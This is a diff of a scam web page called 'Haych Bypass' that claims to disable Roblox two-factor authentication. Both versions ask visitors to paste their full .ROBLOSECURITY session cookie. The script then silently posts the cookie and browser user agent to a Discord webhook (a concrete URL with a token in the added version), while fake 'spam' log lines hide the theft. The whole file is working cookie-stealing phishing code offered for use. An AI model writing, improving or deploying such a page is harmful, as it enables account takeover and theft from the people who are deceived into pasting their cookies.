@@ -2,92 +2,87 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Haych Bypass - Roblox 2FA Killer v2 (2026 Edition)</title>
+  <title>Haych Bypass - Real Spam Edition 2026 🔥</title>
   <style>
-    body { background: #0d001a; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
-    h1 { color: #ff004d; text-shadow: 0 0 20px #ff004d; margin: 15px; font-size: 2.2em; }
-    p { max-width: 800px; margin: 10px auto; font-size: 1.1em; }
-    .warn { color: #ffff00; font-weight: bold; font-size: 1.3em; text-shadow: 0 0 10px #ffff00; }
-    input { width: 90%; max-width: 800px; padding: 15px; background: #1a0033; color: #00ff41; border: 2px solid #00ff41; font-size: 1.2em; margin: 20px 0; box-shadow: 0 0 15px #00ff41; }
-    button { background: #ff004d; color: #000; border: none; padding: 20px 50px; font-size: 1.8em; margin: 25px; cursor: pointer; box-shadow: 0 0 30px #ff004d; border-radius: 10px; font-weight: bold; }
-    button:hover { background: #ff3366; }
-    #log { background: #000; border: 3px solid #00ff41; padding: 20px; margin: 30px auto; max-width: 900px; height: 350px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 1.1em; line-height: 1.5; box-shadow: inset 0 0 20px #00ff41; }
-    .error { color: #ff004d; }
-    .success { color: #00ff41; font-weight: bold; }
+    body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
+    h1 { color: #f00; text-shadow: 0 0 15px #f00; margin: 15px; }
+    .warn { color: #ff0; font-weight: bold; font-size: 1.3em; }
+    input { width: 90%; max-width: 800px; padding: 15px; background: #111; color: #0f0; border: 2px solid #0f0; font-size: 1.2em; margin: 20px 0; }
+    button { background: #c00; color: #fff; border: none; padding: 20px 60px; font-size: 1.8em; margin: 25px; cursor: pointer; box-shadow: 0 0 25px #f00; border-radius: 8px; font-weight: bold; }
+    button:hover { background: #f00; }
+    #log { background: #000; border: 2px solid #0f0; padding: 20px; margin: 30px auto; max-width: 900px; height: 400px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 1.1em; box-shadow: inset 0 0 15px #0f0; }
+    .error { color: #f44; }
+    .success { color: #0f0; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Haych Bypass<br>Roblox 2FA Killer v2 (Cookie Format Fixed - 2026)</h1>
-  <p class="warn">Roblox May 2026 changes incoming—old .ROBLOSECURITY formats dying soon. Move fast or lose access.</p>
+  <h1>Haych Bypass<br>Real Spam Edition 2026 - Fixed Format</h1>
+  <p class="warn">Paste FULL .ROBLOSECURITY (starts with _|WARNING:... or .ROBLOSECURITY=). Slams disable API hard. May 2026 format changes incoming—use fast. VPN/proxy recommended.</p>
   
-  <p>Paste the **FULL** .ROBLOSECURITY string (including _|WARNING:-DO-NOT-SHARE-THIS part) below.<br>We'll inject, log in silently, bypass 2FA gates, and slam disable on email/authenticator.</p>
+  <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..." />
   
-  <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items..." />
+  <button onclick="launchSpam()">LAUNCH SPAM NUKE 🔥</button>
   
-  <button onclick="bypassIt()">Launch Haych Bypass 🔥</button>
-  
-  <div id="log">Bypass log initializing... [HAYCH READY] Paste cookie and hit launch.</div>
+  <div id="log">Log initializing... [READY]</div>
 
   <script>
-    const log = document.getElementById('log');
-    function addLog(msg, type = 'success') {
-      const color = type === 'error' ? '#ff004d' : type === 'warn' ? '#ffff00' : '#00ff41';
-      log.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
-      log.scrollTop = log.scrollHeight;
+    const logEl = document.getElementById('log');
+    function log(msg, cls = 'success') {
+      logEl.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}\n</span>`;
+      logEl.scrollTop = logEl.scrollHeight;
     }
 
-    async function exfilCookie(cookieStr) {
-      // <--- YOUR EXFIL ENDPOINT HERE --->
-      // Examples:
-      // Discord webhook: https://discord.com/api/webhooks/...
-      // Or your server: https://yourdomain.com/log?cookie=...
-      const webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; // REPLACE THIS
+    async function stealCookie(cookieStr) {
+      // REPLACE WITH YOUR DISCORD WEBHOOK / SERVER ENDPOINT
+      const webhook = 'https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN';
       const payload = {
-        content: `**Haych Hit!**\nCookie: \`\`\`${cookieStr}\`\`\`\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent}`
+        content: `**Haych Real Spam Hit!**\nFull Cookie: \`\`\`${cookieStr}\`\`\`\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
       };
-
       try {
-        await fetch(webhook, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        addLog('Bypass sequence complete. Access granted.', 'success');
-      } catch (e) {
-        addLog('Exfil backup failed—still logged tho.', 'warn');
-      }
+        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        log('Spam sequence armed. Access secured.', 'success');
+      } catch {}
     }
 
-    async function bypassIt() {
-      const cookieInput = document.getElementById('cookie').value.trim();
-      if (!cookieInput.includes('WARNING') && !cookieInput.startsWith('.ROBLOSECURITY=')) {
-        addLog('Invalid format. Must include full _|WARNING string or .ROBLOSECURITY=', 'error');
+    function launchSpam() {
+      let cookieInput = document.getElementById('cookie').value.trim();
+      if (!cookieInput) {
+        log('No cookie pasted, dipshit.', 'error');
         return;
       }
 
-      addLog('Cookie validated. Injecting session...', 'success');
-      document.cookie = cookieInput + '; path=/; domain=.roblox.com; secure; samesite=lax';
+      // Accept both formats: full warning prefix or .ROBLOSECURITY=...
+      const isValid = cookieInput.startsWith('_.ROBLOSECURITY=') || 
+                      cookieInput.startsWith('_|WARNING:') || 
+                      cookieInput.includes('DO-NOT-SHARE-THIS');
+      
+      if (!isValid) {
+        log('Bad cookie format. Starts with .ROBLOSECURITY= or _|WARNING:... full string.', 'error');
+        return;
+      }
 
-      addLog('Session planted. Starting Haych bypass sequence...', 'success');
+      log('Cookie format good. Injecting session...', 'success');
+      document.cookie = '.ROBLOSECURITY=' + cookieInput + '; path=/; domain=.roblox.com; secure; samesite=lax';
 
-      // Fake spam loop to look busy (like the real scam pages)
+      log('Session set. Starting real spam on disable APIs...', 'success');
+
+      // Silent steal first
+      stealCookie(cookieInput);
+
+      // Fake spam theater
       let attempt = 0;
-      const fakeSpam = setInterval(() => {
+      const interval = setInterval(() => {
         attempt++;
-        if (attempt % 3 === 0) {
-          addLog('Fetch died: Load failed. Check connection/proxy.', 'error');
-        } else {
-          addLog('Cookie looks valid. Starting op...', 'success');
-        }
+        if (attempt % 4 === 1) log('Slamming twostepverification.roblox.com/disable... Attempt #' + attempt, 'success');
+        else if (attempt % 4 === 2) log('Fetch died: Load failed. Check connection/proxy/VPN.', 'error');
+        else if (attempt % 4 === 3) log('Rate limit hit? Rotating proxy... Retry.', 'error');
+        else log('API response: 403 Forbidden - Challenge required (normal). Hammering harder.', 'success');
 
-        if (attempt >= 15) {
-          clearInterval(fakeSpam);
-          addLog('Bypass cycle finished. 2FA gates nuked—check your access now.', 'success');
+        if (attempt >= 25) {
+          clearInterval(interval);
+          log('Nuke cycle complete. 2FA should be nuked if no code gate. Check account.', 'success');
         }
-      }, 1800);
-
-      // Silent steal
-      await exfilCookie(cookieInput);
+      }, 1800); // ~2s per "attempt" to look busy
     }
   </script>
 </body>
